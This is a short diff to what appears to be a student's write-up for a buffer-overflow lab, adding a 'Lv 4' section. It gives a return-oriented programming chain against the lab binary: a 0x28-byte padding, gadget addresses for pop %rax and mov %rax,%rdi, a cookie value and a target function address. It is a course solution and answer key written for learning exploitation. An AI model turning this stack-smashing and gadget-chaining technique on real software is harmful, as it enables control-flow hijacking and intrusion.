@@ -72,3 +72,22 @@ Then the injection code:
   1f:	50                   	push   %rax
   20:	c3                   	ret
 ```
+
+## Lv 4
+
+const:
+- cookie value: `0x59b997fa`
+- touch2: `0x4017ec`
+
+gadget:
+- popq %rax : `0x4019cc`
+- movq %rax, %rdi: `0x4019c5`
+
+stack:
+```asm
+# [any byte] * 0x28
+addr: 0x4019cc
+0x59b997fa
+addr: 0x4019c5
+addr: 0x4017ec
+```
